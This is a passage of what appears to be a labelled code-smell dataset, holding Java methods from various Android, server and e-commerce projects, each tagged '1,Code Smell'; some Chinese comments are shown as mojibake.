    return true;
  }
  stopSeek(false);
}
return true;
case KeyEvent.KEYCODE_DPAD_RIGHT:
case KeyEvent.KEYCODE_PLUS:
case KeyEvent.KEYCODE_MEDIA_FAST_FORWARD:
if (keyEvent.getAction() == KeyEvent.ACTION_DOWN) {
setControlsMode(CONTROLS_MODE_COMPACT);
onForward();
}
 else {
if ((mPlayerData.isSeekConfirmPauseEnabled() || mPlayerData.isSeekConfirmPlayEnabled()) && keyCode == KeyEvent.KEYCODE_DPAD_RIGHT) {
return true;
}
stopSeek(false);
}
return true;
case KeyEvent.KEYCODE_DPAD_CENTER:
case KeyEvent.KEYCODE_ENTER:
if (!mInSeek) {
return false;
}
if (keyEvent.getAction() == KeyEvent.ACTION_DOWN) {
stopSeek(false);
}
return mIsPlaying;
case KeyEvent.KEYCODE_BACK:
case KeyEvent.KEYCODE_ESCAPE:
if (!mInSeek) {
return false;
}
if (keyEvent.getAction() == KeyEvent.ACTION_UP) {
stopSeek(Build.VERSION.SDK_INT >= 21 ? !mProgressBar.isAccessibilityFocused() : true);
}
return true;
}
return false;
}",1,Code Smell
"/** 
 * trigger job
 * @param jobId
 * @param triggerType
 * @param failRetryCount        >=0: use this param<0: use param from job info config
 * @param executorShardingParam
 * @param executorParam         null: use job paramnot null: cover job param
 */
public static void trigger(int jobId,TriggerTypeEnum triggerType,int failRetryCount,String executorShardingParam,String executorParam){
  JobInfo jobInfo=JobAdminConfig.getAdminConfig().getJobInfoMapper().loadById(jobId);
  if (jobInfo == null) {
    logger.warn("">>>>>>>>>>>> trigger fail, jobId invalid，jobId={}"",jobId);
    return;
  }
  if (GlueTypeEnum.BEAN.getDesc().equals(jobInfo.getGlueType())) {
    String json=JSONUtils.changeJson(jobInfo.getJobJson(),JSONUtils.decrypt);
    jobInfo.setJobJson(json);
  }
  if (StringUtils.isNotBlank(executorParam)) {
    jobInfo.setExecutorParam(executorParam);
  }
  int finalFailRetryCount=failRetryCount >= 0 ? failRetryCount : jobInfo.getExecutorFailRetryCount();
  JobGroup group=JobAdminConfig.getAdminConfig().getJobGroupMapper().load(jobInfo.getJobGroup());
  int[] shardingParam=null;
  if (executorShardingParam != null) {
    String[] shardingArr=executorShardingParam.split(""/"");
    if (shardingArr.length == 2 && isNumeric(shardingArr[0]) && isNumeric(shardingArr[1])) {
      shardingParam=new int[2];
      shardingParam[0]=Integer.valueOf(shardingArr[0]);
      shardingParam[1]=Integer.valueOf(shardingArr[1]);
    }
  }
  if (ExecutorRouteStrategyEnum.SHARDING_BROADCAST == ExecutorRouteStrategyEnum.match(jobInfo.getExecutorRouteStrategy(),null) && group.getRegistryList() != null && !group.getRegistryList().isEmpty() && shardingParam == null) {
    for (int i=0; i < group.getRegistryList().size(); i++) {
      processTrigger(group,jobInfo,finalFailRetryCount,triggerType,i,group.getRegistryList().size());
    }
  }
 else {
    if (shardingParam == null) {
      shardingParam=new int[]{0,1};
    }
    processTrigger(group,jobInfo,finalFailRetryCount,triggerType,shardingParam[0],shardingParam[1]);
  }
}",1,Code Smell
"@Override public ErrorCode action(ByteBuf ackPayload,String clientID,String fromUser,ProtoConstants.RequestSourceType requestSourceType,WFCMessage.QuitGroupRequest request,Qos1PublishHandler.IMCallback callback){
  boolean isAdmin=requestSourceType == ProtoConstants.RequestSourceType.Request_From_Admin;
  if (request.hasNotifyContent() && request.getNotifyContent().getType() > 0 && requestSourceType == ProtoConstants.RequestSourceType.Request_From_User && !m_messagesStore.isAllowClientCustomGroupNotification()) {
    return ErrorCode.ERROR_CODE_NOT_RIGHT;
  }
  if (request.hasNotifyContent() && request.getNotifyContent().getType() > 0 && requestSourceType == ProtoConstants.RequestSourceType.Request_From_Robot && !m_messagesStore.isAllowRobotCustomGroupNotification()) {
    return ErrorCode.ERROR_CODE_NOT_RIGHT;
  }
  if (requestSourceType == ProtoConstants.RequestSourceType.Request_From_User) {
    int forbiddenClientOperation=m_messagesStore.getGroupForbiddenClientOperation();
    if ((forbiddenClientOperation & ProtoConstants.ForbiddenClientGroupOperationMask.Forbidden_Quit_Group) > 0) {
      return ErrorCode.ERROR_CODE_NOT_RIGHT;
    }
  }
  ErrorCode errorCode=m_messagesStore.quitGroup(fromUser,request.getGroupId(),isAdmin);
  if (errorCode == ErrorCode.ERROR_CODE_SUCCESS) {
    if (request.hasNotifyContent() && request.getNotifyContent().getType() > 0) {
      sendGroupNotification(fromUser,request.getGroupId(),request.getToLineList(),request.getNotifyContent());
    }
 else {
      WFCMessage.MessageContent content=new GroupNotificationBinaryContent(request.getGroupId(),fromUser,request.getKeepMsg() > 0 ? ""1"" : ""0"","""").getQuitGroupNotifyContent();
      sendGroupNotification(fromUser,request.getGroupId(),request.getToLineList(),content);
    }
    if ((m_messagesStore.getVisibleQuitKickoffNotification() & 0x01) > 0) {
      Set<String> toUsers=m_messagesStore.getGroupManagers(request.getGroupId(),true);
      WFCMessage.MessageContent content=new GroupNotificationBinaryContent(request.getGroupId(),fromUser,request.getKeepMsg() > 0 ? ""1"" : ""0"","""").getQuitVisibleGroupNotifyContent();
      sendGroupNotification(fromUser,request.getGroupId(),request.getToLineList(),content,toUsers);
    }
  }
  return errorCode;
}",1,Code Smell
"private void processDone(){
  if (doneButtonDrawable.getProgress() > 0f)   return;
  doneButtonDrawable.animateToProgress(1f);
  TLRPC.UserFull userFull=getMessagesController().getUserFull(getUserConfig().getClientUserId());
  TLRPC.TL_account_updateBusinessIntro req=new TLRPC.TL_account_updateBusinessIntro();
  if (!isEmpty()) {
    req.flags|=1;
    req.intro=new TLRPC.TL_inputBusinessIntro();
    req.intro.title=titleEdit.getText().toString();
    req.intro.description=messageEdit.getText().toString();
    if (!stickerRandom && (sticker != null || inputSticker != null)) {
      req.intro.flags|=1;
      if (inputSticker != null) {
        req.intro.sticker=inputSticker;
      }
 else {
        req.intro.sticker=getMessagesController().getInputDocument(sticker);
      }
    }
    if (userFull != null) {
      userFull.flags2|=16;
      userFull.business_intro=new TLRPC.TL_businessIntro();
      userFull.business_intro.title=req.intro.title;
      userFull.business_intro.description=req.intro.description;
      if (!stickerRandom && sticker != null) {
        userFull.business_intro.flags|=1;
        userFull.business_intro.sticker=sticker;
      }
    }
  }
 else {
    if (userFull != null) {
      userFull.flags2&=~16;
      userFull.business_intro=null;
    }
  }
  getConnectionsManager().sendRequest(req,(res,err) -> AndroidUtilities.runOnUIThread(() -> {
    if (err != null) {
      doneButtonDrawable.animateToProgress(0f);
      BulletinFactory.showError(err);
    }
 else     if (res instanceof TLRPC.TL_boolFalse) {
      doneButtonDrawable.animateToProgress(0f);
      BulletinFactory.of(this).createErrorBulletin(LocaleController.getString(R.string.UnknownError)).show();
    }
 else {
      if (inputSticker != null) {
        getMessagesController().loadFullUser(getUserConfig().getCurrentUser(),0,true);
      }
      finishFragment();
    }
  }
));
  getMessagesStorage().updateUserInfo(userFull,false);
}",1,Code Smell
"public static FileService build(){
  UploadConfig uploadConfig=ApplicationContextHolder.getBean(UploadConfig.class);
  Integer config=uploadConfig.getConfig();
  if (config.equals(UploadFileEnum.ALI_OSS.getConfig())) {
    return new OssFileServiceImpl(uploadConfig.getOss());
  }
 else   if (config.equals(UploadFileEnum.LOCAL.getConfig())) {
    return new LocalFileServiceImpl(uploadConfig.getLocal());
  }
 else   if (config.equals(UploadFileEnum.ALI_COS.getConfig())) {
    return new TencentFileServiceImpl(uploadConfig.getCos());
  }
 else   if (config.equals(UploadFileEnum.ALI_QNC.getConfig())) {
    return new QncFileServiceImpl(uploadConfig.getQnc());
  }
  return new LocalFileServiceImpl(uploadConfig.getLocal());
}
",1,Code Smell
"private short getNaturalSdkVersionRequirement(){
  if ((screenLayout2 & MASK_SCREENROUND) != 0) {
    return SDK_MNC;
  }
  if (density == DENSITY_ANY) {
    return SDK_LOLLIPOP;
  }
  if (smallestScreenWidthDp != 0 || screenWidthDp != 0 || screenHeightDp != 0) {
    return SDK_HONEYCOMB_MR2;
  }
  if ((uiMode & (MASK_UI_MODE_TYPE | MASK_UI_MODE_NIGHT)) != UI_MODE_NIGHT_ANY) {
    return SDK_FROYO;
  }
  if ((screenLayout & (MASK_SCREENSIZE | MASK_SCREENLONG)) != SCREENSIZE_ANY || density != DENSITY_DEFAULT) {
    return SDK_DONUT;
  }
  return 0;
}",1,Code Smell
"/** 
 * 鏍￠獙浜ゆ槗璁㈠崟椤规槸鍚﹀彲浠ョ敵璇峰敭鍚�
 * @param userId      鐢ㄦ埛缂栧彿
 * @param createReqVO 鍞悗鍒涘缓淇℃伅
 * @return 浜ゆ槗璁㈠崟椤�
 */
private TradeOrderItemDO validateOrderItemApplicable(Long userId,AppAfterSaleCreateReqVO createReqVO){
  TradeOrderItemDO orderItem=tradeOrderQueryService.getOrderItem(userId,createReqVO.getOrderItemId());
  if (orderItem == null) {
    throw exception(ORDER_ITEM_NOT_FOUND);
  }
  if (!TradeOrderItemAfterSaleStatusEnum.isNone(orderItem.getAfterSaleStatus())) {
    throw exception(AFTER_SALE_CREATE_FAIL_ORDER_ITEM_APPLIED);
  }
  if (createReqVO.getRefundPrice() > orderItem.getPayPrice()) {
    throw exception(AFTER_SALE_CREATE_FAIL_REFUND_PRICE_ERROR);
  }
  TradeOrderDO order=tradeOrderQueryService.getOrder(userId,orderItem.getOrderId());
  if (order == null) {
    throw exception(ORDER_NOT_FOUND);
  }
  if (TradeOrderStatusEnum.isCanceled(order.getStatus())) {
    throw exception(AFTER_SALE_CREATE_FAIL_ORDER_STATUS_CANCELED);
  }
  if (!TradeOrderStatusEnum.havePaid(order.getStatus())) {
    throw exception(AFTER_SALE_CREATE_FAIL_ORDER_STATUS_NO_PAID);
  }
  if (createReqVO.getWay().equals(AfterSaleWayEnum.RETURN_AND_REFUND.getWay()) && !TradeOrderStatusEnum.haveDelivered(order.getStatus())) {
    throw exception(AFTER_SALE_CREATE_FAIL_ORDER_STATUS_NO_DELIVERED);
  }
  return orderItem;
}
",1,Code Smell
"public void update(FileUpdateRequest request,String operator){
  FileMetadata fileMetadata=fileMetadataMapper.selectByPrimaryKey(request.getId());
  if (fileMetadata == null) {
    throw new MSException(Translator.get(""file.not.exist""));
  }
  if (!StringUtils.isAllBlank(request.getName(),request.getDescription(),request.getModuleId()) || request.getEnable() != null || request.getTags() != null) {
    FileMetadata updateExample=new FileMetadata();
    updateExample.setId(request.getId());
    updateExample.setDescription(request.getDescription());
    updateExample.setModuleId(request.getModuleId());
    if (StringUtils.isNotBlank(request.getName())) {
      this.checkMinIOFileName(request.getId(),request.getName(),fileMetadata.getType(),fileMetadata.getProjectId());
      updateExample.setName(request.getName());
    }
    if (request.getTags() != null) {
      updateExample.setTags(request.getTags());
    }
 else {
      updateExample.setTags(null);
    }
    if (request.getEnable() != null) {
      this.checkEnableFile(fileMetadata.getType());
      updateExample.setEnable(request.getEnable());
    }
    updateExample.setUpdateUser(operator);
    updateExample.setUpdateTime(System.currentTimeMillis());
    fileMetadataMapper.updateByPrimaryKeySelective(updateExample);
    FileMetadata newFile=fileMetadataMapper.selectByPrimaryKey(request.getId());
    fileMetadataLogService.saveUpdateLog(fileMetadata,newFile,fileMetadata.getProjectId(),operator);
  }
}
",1,Code Smell
"@Override public int transform(CtClass clazz,int pos,CodeIterator iterator,ConstPool cp) throws BadBytecode {
  int c=iterator.byteAt(pos);
  if (c == INVOKEINTERFACE || c == INVOKESTATIC || c == INVOKEVIRTUAL) {
    int index=iterator.u16bitAt(pos + 1);
    String cname=cp.eqMember(methodname,methodDescriptor,index);
    if (cname != null && matchClass(cname,clazz.getClassPool())) {
      int ntinfo=cp.getMemberNameAndType(index);
      pos=match(c,pos,iterator,cp.getNameAndTypeDescriptor(ntinfo),cp);
    }
  }
  return pos;
}",1,Code Smell
"public boolean isValidBogeyOffset(int i){
  if ((i < 3 || bogeyCount == 0) && i != 0)   return false;
  for (  int j : bogeyLocations) {
    if (j == -1)     break;
    if (i >= j - 2 && i <= j + 2)     return false;
  }
  return true;
}",1,Code Smell
"@Around(""(execution(* com.kakarote.*.controller..*(..))||execution(* com.kakarote.*.*.controller..*(..))) && execution(@(org.springframework.web.bind.annotation.*Mapping) * *(..))  && !execution(@(com.kakarote.core.common.ParamAspect) * *(..))"") public Object around(ProceedingJoinPoint point) throws Throwable {
  ServletRequestAttributes attributes=((ServletRequestAttributes)RequestContextHolder.getRequestAttributes());
  HttpServletRequest request=attributes.getRequest();
  try {
    String token=request.getHeader(Const.TOKEN_NAME);
    if (StrUtil.isEmpty(token)) {
      if (point instanceof MethodInvocationProceedingJoinPoint) {
        Method targetMethod=((MethodSignature)point.getSignature()).getMethod();
        LoginFromCookie fromCookie=targetMethod.getAnnotation(LoginFromCookie.class);
        if (fromCookie != null) {
          for (          Cookie cookie : request.getCookies()) {
            if (Const.TOKEN_NAME.equals(cookie.getName())) {
              token=cookie.getValue();
              break;
            }
          }
        }
      }
    }
    UserInfo info=null;
    if (StrUtil.isNotEmpty(token)) {
      Object data=redis.get(token);
      if (data instanceof UserExtraInfo) {
        throw new NoLoginException((UserExtraInfo)data);
      }
 else       if (data instanceof UserInfo) {
        info=(UserInfo)data;
      }
      if (info != null) {
        info.setRequest(request);
        info.setResponse(attributes.getResponse());
        UserUtil.setUser(info);
        UserUtil.userExpire(token);
      }
    }
    if (info == null) {
      info=new UserInfo();
      info.setRequest(request);
      info.setResponse(attributes.getResponse());
      UserUtil.setUser(info);
    }
    return point.proceed();
  }
  finally {
    UserUtil.removeUser();
  }
}
",1,Code Smell
"public static void checkRestrictedInviteUsers(int currentAccount,TLRPC.Chat currentChat,TLRPC.TL_messages_invitedUsers invitedUsers){
  if (invitedUsers == null || invitedUsers.missing_invitees.isEmpty() || currentChat == null) {
    return;
  }
  ArrayList<TLRPC.User> users=new ArrayList<>();
  ArrayList<Long> pmLockedUsers=new ArrayList<>();
  ArrayList<Long> inviteLockedUsers=new ArrayList<>();
  for (  TLRPC.TL_missingInvitee missing_invitee : invitedUsers.missing_invitees) {
    TLRPC.User user=null;
    if (invitedUsers.updates != null) {
      for (int i=0; i < invitedUsers.updates.users.size(); ++i) {
        TLRPC.User u=invitedUsers.updates.users.get(i);
        if (u.id == missing_invitee.user_id) {
          user=u;
          break;
        }
      }
    }
    if (user == null) {
      user=MessagesController.getInstance(currentAccount).getUser(missing_invitee.user_id);
    }
    if (user == null) {
      continue;
    }
    users.add(user);
    if (missing_invitee.premium_required_for_pm) {
      pmLockedUsers.add(user.id);
    }
    if (missing_invitee.premium_would_allow_invite) {
      inviteLockedUsers.add(user.id);
    }
  }
  if (users.isEmpty())   return;
  AndroidUtilities.runOnUIThread(() -> {
    if (!LaunchActivity.isActive)     return;
    BaseFragment lastFragment=LaunchActivity.getLastFragment();
    if (lastFragment != null && lastFragment.getParentActivity() != null) {
      LimitReachedBottomSheet restrictedUsersBottomSheet=new LimitReachedBottomSheet(lastFragment,lastFragment.getParentActivity(),LimitReachedBottomSheet.TYPE_ADD_MEMBERS_RESTRICTED,currentAccount,null);
      restrictedUsersBottomSheet.setRestrictedUsers(currentChat,users,pmLockedUsers,inviteLockedUsers);
      restrictedUsersBottomSheet.show();
    }
  }
,200);
}",1,Code Smell
"@Override public void check() throws SQLException {
  queryPlan1Sequences=new ArrayList<>();
  queryPlan2Sequences=new ArrayList<>();
  PostgresTables tables=state.getSchema().getRandomTableNonEmptyTables();
  List<PostgresExpression> tableList=tables.getTables().stream().map(t -> new PostgresTableReference(t)).collect(Collectors.toList());
  gen=new PostgresExpressionGenerator(state).setColumns(tables.getColumns());
  List<PostgresExpression> fetchColumns=new ArrayList<>();
  fetchColumns.addAll(Randomly.nonEmptySubset(tables.getColumns()).stream().map(c -> new PostgresColumnReference(c)).collect(Collectors.toList()));
  select=new PostgresSelect();
  select.setFetchColumns(fetchColumns);
  select.setFromList(tableList);
  List<PostgresExpression> joins=PostgresJoin.getJoins(tableList,state);
  select.setJoinList(joins);
  select.setSelectType(Randomly.fromOptions(PostgresSelect.SelectType.values()));
  if (Randomly.getBoolean()) {
    select.setWhereClause(gen.generateExpression(0,PostgresDataType.BOOLEAN));
  }
  if (Randomly.getBoolean()) {
    select.setGroupByExpressions(fetchColumns);
    if (Randomly.getBoolean()) {
      select.setWhereClause(gen.generateExpression(0,PostgresDataType.BOOLEAN));
    }
  }
  String queryString1=PostgresVisitor.asString(select);
  int rowCount1=getRow(state,queryString1,queryPlan1Sequences);
  boolean increase=mutate(Mutator.LIMIT);
  String queryString2=PostgresVisitor.asString(select);
  int rowCount2=getRow(state,queryString2,queryPlan2Sequences);
  if (DBMSCommon.editDistance(queryPlan1Sequences,queryPlan2Sequences) > 1) {
    return;
  }
  if (increase && rowCount1 > (rowCount2 + 1) || !increase && (rowCount1 + 1) < rowCount2) {
    throw new AssertionError(""Inconsistent result for query: EXPLAIN "" + queryString1 + ""; --""+ rowCount1+ ""\nEXPLAIN ""+ queryString2+ ""; --""+ rowCount2);
  }
}",1,Code Smell
"public JdbcBatchingOutputFormat<RowData,?,?> build(){
  checkNotNull(jdbcOptions,""jdbc options can not be null"");
  checkNotNull(dmlOptions,""jdbc dml options can not be null"");
  checkNotNull(executionOptions,""jdbc execution options can not be null"");
  final LogicalType[] logicalTypes=Arrays.stream(fieldDataTypes).map(DataType::getLogicalType).toArray(LogicalType[]::new);
  if (dmlOptions.getKeyFields().isPresent() && dmlOptions.getKeyFields().get().length > 0 && !appendMode) {
    return new JdbcBatchingOutputFormat<>(new SimpleJdbcConnectionProvider(jdbcOptions),executionOptions,ctx -> createBufferReduceExecutor(dmlOptions,ctx,rowDataTypeInformation,logicalTypes),JdbcBatchingOutputFormat.RecordExtractor.identity(),inlongMetric,auditHostAndPorts,dirtyOptions,dirtySink,auditKeys);
  }
 else {
    final String sql=dmlOptions.getDialect().getInsertIntoStatement(dmlOptions.getTableName(),dmlOptions.getFieldNames());
    return new JdbcBatchingOutputFormat<>(new SimpleJdbcConnectionProvider(jdbcOptions),executionOptions,ctx -> createSimpleBufferedExecutor(ctx,dmlOptions.getDialect(),dmlOptions.getFieldNames(),logicalTypes,sql,rowDataTypeInformation),JdbcBatchingOutputFormat.RecordExtractor.identity(),inlongMetric,auditHostAndPorts,dirtyOptions,dirtySink,auditKeys);
  }
}",1,Code Smell
"/** 
 * 鏌ヨ瀹℃壒鐢ㄦ埛锛屼笉浼氬瓨鍦ㄦ潯浠跺鎵圭殑鎯呭喌
 * @param createUserId 鍒涘缓浜�
 * @param recordId     瀹℃牳璁板綍ID
 * @param examineFlow  褰撳墠瀹℃壒娴佺▼
 * @return data
 */
public ExamineUserBO queryFlowUser(Long createUserId,Integer recordId,ExamineFlow examineFlow){
  List<UserInfo> userInfoList=adminService.queryUserInfoList().getData();
  ExamineFlowSuperior flowSuperior=lambdaQuery().eq(ExamineFlowSuperior::getFlowId,examineFlow.getFlowId()).last("" limit 1"").one();
  UserInfo userInfo=null;
  for (  UserInfo info : userInfoList) {
    if (info.getUserId().equals(createUserId)) {
      userInfo=info;
    }
  }
  if (userInfo == null) {
    throw new CrmException(SystemCodeEnum.SYSTEM_NO_VALID);
  }
  ExamineUserBO examineUserBO=new ExamineUserBO();
  Integer examineErrorHandling=examineFlow.getExamineErrorHandling();
  List<Long> ids;
  if (userInfo.getParentId() == null || userInfo.getParentId() == 0) {
    ids=new ArrayList<>();
  }
 else {
    List<Long> longList=queryUser(userInfoList,userInfo.getParentId());
    ids=new ArrayList<>();
    if (flowSuperior.getParentLevel() > longList.size()) {
      ids.add(longList.get(longList.size() - 1));
    }
 else {
      ids.add(longList.get(flowSuperior.getParentLevel() - 1));
    }
  }
  examineUserBO.setUserList(handleUserList(ids,examineFlow.getExamineId()));
  examineUserBO.setType(3);
  return examineUserBO;
}",1,Code Smell
"private void refreshSmallScreenForPageBack(int oldPageIndex,int newPageIndex){
  if (!mIsSpeakerModeOn || !(oldPageIndex == 1) || !(newPageIndex == 0)) {
    return;
  }
  UserEntity smallUser=mUserDisplayView.getUserEntity();
  if (smallUser == null) {
    return;
  }
  mUserDisplayView.setUserEntity(smallUser);
  if (smallUser.isVideoAvailable()) {
    startVideoPlay(smallUser);
  }
 else {
    stopVideoPlay(smallUser);
  }
  ensureUserTalkingViewFullyDisplayed();
}",1,Code Smell
"@Override public void updateCouponTemplate(CouponTemplateUpdateReqVO updateReqVO){
  CouponTemplateDO couponTemplate=validateCouponTemplateExists(updateReqVO.getId());
  if (CouponTakeTypeEnum.isUser(couponTemplate.getTakeType()) && ObjUtil.notEqual(couponTemplate.getTakeLimitCount(),CouponTemplateDO.TIME_LIMIT_COUNT_MAX) && updateReqVO.getTotalCount() < couponTemplate.getTakeCount()) {
    throw exception(COUPON_TEMPLATE_TOTAL_COUNT_TOO_SMALL,couponTemplate.getTakeCount());
  }
  validateProductScope(updateReqVO.getProductScope(),updateReqVO.getProductScopeValues());
  CouponTemplateDO updateObj=CouponTemplateConvert.INSTANCE.convert(updateReqVO);
  couponTemplateMapper.updateById(updateObj);
}
",1,Code Smell
"private void loadReactions(){
  MessagesController ctrl=MessagesController.getInstance(currentAccount);
  TLRPC.TL_messages_getMessageReactionsList getList=new TLRPC.TL_messages_getMessageReactionsList();
  getList.peer=ctrl.getInputPeer(message.getDialogId());
  getList.id=message.getId();
  getList.limit=3;
  getList.reaction=null;
  getList.offset=null;
  ConnectionsManager.getInstance(currentAccount).sendRequest(getList,(response,error) -> {
    if (response instanceof TLRPC.TL_messages_messageReactionsList) {
      TLRPC.TL_messages_messageReactionsList list=(TLRPC.TL_messages_messageReactionsList)response;
      int c=list.count;
      int ic=list.users.size();
      post(() -> {
        String str;
        if (seenUsers.isEmpty() || seenUsers.size() < c) {
          str=LocaleController.formatPluralString(""ReactionsCount"",c);
        }
 else {
          String countStr;
          int n;
          if (c == seenUsers.size()) {
            countStr=String.valueOf(n=c);
          }
 else {
            countStr=(n=c) + ""/"" + seenUsers.size();
          }
          str=String.format(LocaleController.getPluralString(""Reacted"",n),countStr);
        }
        if (getMeasuredWidth() > 0) {
          fixedWidth=getMeasuredWidth();
        }
        titleView.setText(str);
        boolean showIcon=true;
        if (message.messageOwner.reactions != null && message.messageOwner.reactions.results.size() == 1 && !list.reactions.isEmpty()) {
          for (          TLRPC.TL_availableReaction r : MediaDataController.getInstance(currentAccount).getReactionsList()) {
            if (r.reaction.equals(list.reactions.get(0).reaction)) {
              reactView.setImage(ImageLocation.getForDocument(r.center_icon),""40_40_lastreactframe"",""webp"",null,r);
              reactView.setVisibility(VISIBLE);
              reactView.setAlpha(0);
              reactView.animate().alpha(1f).start();
              iconView.setVisibility(GONE);
              showIcon=false;
              break;
            }
          }
        }
        if (showIcon) {
          iconView.setVisibility(VISIBLE);
          iconView.setAlpha(0f);
          iconView.animate().alpha(1f).start();
        }
        for (        TLRPC.User u : list.users) {
          if (message.messageOwner.from_id != null && u.id != message.messageOwner.from_id.user_id) {
            boolean hasSame=false;
            for (int i=0; i < users.size(); i++) {
              if (users.get(i).user.id == u.id) {
                hasSame=true;
                break;
              }
            }
            if (!hasSame) {
              users.add(new UserSeen(u,0));
            }
          }
        }
        updateView();
      }
);
    }
  }
,ConnectionsManager.RequestFlagInvokeAfter);
}",1,Code Smell
"/** 
 * Prepends items using cached locations,  returning true if toLimit is reached. This method should only be called by prependVisibleItems().
 */
protected final boolean prependVisbleItemsWithCache(int toLimit,boolean oneColumnMode){
  if (mLocations.size() == 0) {
    return false;
  }
  int itemIndex;
  int edge;
  int offset;
  if (mFirstVisibleIndex >= 0) {
    edge=mProvider.getEdge(mFirstVisibleIndex);
    offset=getLocation(mFirstVisibleIndex).offset;
    itemIndex=mFirstVisibleIndex - 1;
  }
 else {
    edge=Integer.MAX_VALUE;
    offset=0;
    itemIndex=mStartIndex != START_DEFAULT ? mStartIndex : 0;
    if (itemIndex > getLastIndex() || itemIndex < getFirstIndex() - 1) {
      mLocations.clear();
      return false;
    }
 else     if (itemIndex < getFirstIndex()) {
      return false;
    }
  }
  int firstIndex=Math.max(mProvider.getMinIndex(),mFirstIndex);
  for (; itemIndex >= firstIndex; itemIndex--) {
    Location loc=getLocation(itemIndex);
    int rowIndex=loc.row;
    int size=mProvider.createItem(itemIndex,false,mTmpItem,false);
    if (size != loc.size) {
      mLocations.removeFromStart(itemIndex + 1 - mFirstIndex);
      mFirstIndex=mFirstVisibleIndex;
      mPendingItem=mTmpItem[0];
      mPendingItemSize=size;
      return false;
    }
    mFirstVisibleIndex=itemIndex;
    if (mLastVisibleIndex < 0) {
      mLastVisibleIndex=itemIndex;
    }
    mProvider.addItem(mTmpItem[0],itemIndex,size,rowIndex,edge - offset);
    if (!oneColumnMode && checkPrependOverLimit(toLimit)) {
      return true;
    }
    edge=mProvider.getEdge(itemIndex);
    offset=loc.offset;
    if (rowIndex == 0) {
      if (oneColumnMode) {
        return true;
      }
    }
  }
  return false;
}",1,Code Smell
"private void refreshCustomTable(){
  Map<String,CustomValue> customMap=Maps.newHashMap();
  if (config != null && config.getMethodTemplateConfig() != null && config.getMethodTemplateConfig().getCustomMap() != null) {
    customMap=config.getMethodTemplateConfig().getCustomMap();
  }
  Vector<Vector<String>> customData=new Vector<>(customMap.size());
  for (  Entry<String,CustomValue> entry : customMap.entrySet()) {
    String key=entry.getKey();
    CustomValue value=entry.getValue();
    Vector<String> row=new Vector<>(2);
    row.add(key);
    row.add(value.getType().getDesc());
    row.add(value.getValue());
    customData.add(row);
  }
  DefaultTableModel customModel=new DefaultTableModel(customData,customNames);
  customTable.setModel(customModel);
  customTable.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
  customTable.getColumnModel().getColumn(0).setPreferredWidth((int)(customTable.getWidth() * 0.3));
}",1,Code Smell
"@Override public void onSharedPreferenceChanged(SharedPreferences prefs,String name){
  Log.i(TAG,""Preference "" + name + ""=""+ prefs.getAll().get(name));
  if (""enabled"".equals(name)) {
    boolean enabled=prefs.getBoolean(name,false);
    TextView tvDisabled=findViewById(R.id.tvDisabled);
    tvDisabled.setVisibility(enabled ? View.GONE : View.VISIBLE);
    SwitchCompat swEnabled=getSupportActionBar().getCustomView().findViewById(R.id.swEnabled);
    if (swEnabled.isChecked() != enabled)     swEnabled.setChecked(enabled);
  }
 else   if (""whitelist_wifi"".equals(name) || ""screen_on"".equals(name) || ""screen_wifi"".equals(name)|| ""whitelist_other"".equals(name)|| ""screen_other"".equals(name)|| ""whitelist_roaming"".equals(name)|| ""show_user"".equals(name)|| ""show_system"".equals(name)|| ""show_nointernet"".equals(name)|| ""sort"".equals(name)|| ""imported"".equals(name)) {
    updateApplicationList(null);
    final LinearLayout llWhitelist=findViewById(R.id.llWhitelist);
    boolean screen_on=prefs.getBoolean(""screen_on"",true);
    boolean whitelist_wifi=prefs.getBoolean(""whitelist_wifi"",false);
    boolean whitelist_other=prefs.getBoolean(""whitelist_other"",false);
    boolean hintWhitelist=prefs.getBoolean(""hint_whitelist"",true);
    llWhitelist.setVisibility(!(whitelist_wifi || whitelist_other) && screen_on && hintWhitelist ? View.VISIBLE : View.GONE);
  }
 else   if (""manage_system"".equals(name)) {
    invalidateOptionsMenu();
    updateApplicationList(null);
    LinearLayout llSystem=findViewById(R.id.llSystem);
    boolean system=prefs.getBoolean(""manage_system"",false);
    boolean hint=prefs.getBoolean(""hint_system"",true);
    llSystem.setVisibility(!system && hint ? View.VISIBLE : View.GONE);
  }
 else   if (""dark_theme"".equals(name))   recreate();
}
",1,Code Smell
"public void checkList(RecyclerListView recyclerListView){
  long currentTime=System.currentTimeMillis();
  dialogIds.clear();
  for (int i=0; i < recyclerListView.getChildCount(); i++) {
    View child=recyclerListView.getChildAt(i);
    long dialogId=0;
    if (child instanceof DialogCell) {
      dialogId=((DialogCell)child).getDialogId();
    }
 else     if (child instanceof UserCell) {
      dialogId=((UserCell)child).getDialogId();
    }
    if (dialogId > 0) {
      TLRPC.User user=MessagesController.getInstance(currentAccount).getUser(dialogId);
      if (user != null && !user.bot && !user.self && !user.contact && user.status != null && !(user.status instanceof TLRPC.TL_userStatusEmpty)) {
        long lastPollTime=userPollLastTime.get(dialogId,0);
        if (currentTime - lastPollTime > 60 * 60 * 1000) {
          userPollLastTime.put(dialogId,currentTime);
          dialogIds.add(dialogId);
        }
      }
    }
 else {
      TLRPC.Chat chat=MessagesController.getInstance(currentAccount).getChat(-dialogId);
      if (ChatObject.isChannel(chat)) {
        long lastPollTime=userPollLastTime.get(dialogId,0);
        if (currentTime - lastPollTime > 60 * 60 * 1000) {
          userPollLastTime.put(dialogId,currentTime);
          dialogIds.add(dialogId);
        }
      }
    }
  }
  if (!dialogIds.isEmpty()) {
    collectedDialogIds.addAll(dialogIds);
    AndroidUtilities.cancelRunOnUIThread(requestCollectedRunnables);
    AndroidUtilities.runOnUIThread(requestCollectedRunnables,300);
  }
}",1,Code Smell
"@Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
  if (LicenseStatus.sDisableCommonHooks) {
    return;
  }
  if (!isEnabled()) {
    return;
  }
  String fileName=(String)param.args[0];
  if (""splash.jpg"".equals(fileName) || ""splash_big.jpg"".equals(fileName) || ""splash/splash_simple.png"".equals(fileName)|| ""splash/splash_big_simple.png"".equals(fileName)) {
    String customPath=RikkaCustomSplash.getCurrentSplashPath();
    if (customPath == null) {
      return;
    }
    File f=new File(customPath);
    if (f.exists() && f.isFile() && f.canRead()) {
      param.setResult(new FileInputStream(f));
    }
  }
  if (""splash_logo.png"".equals(fileName)) {
    param.setResult(new ByteArrayInputStream(TRANSPARENT_PNG));
  }
}",1,Code Smell
"private void beginOrAdjustReorderPreviewAnimations(ItemConfiguration solution,View dragView,int mode){
  int childCount=mShortcutsAndWidgets.getChildCount();
  for (int i=0; i < childCount; i++) {
    View child=mShortcutsAndWidgets.getChildAt(i);
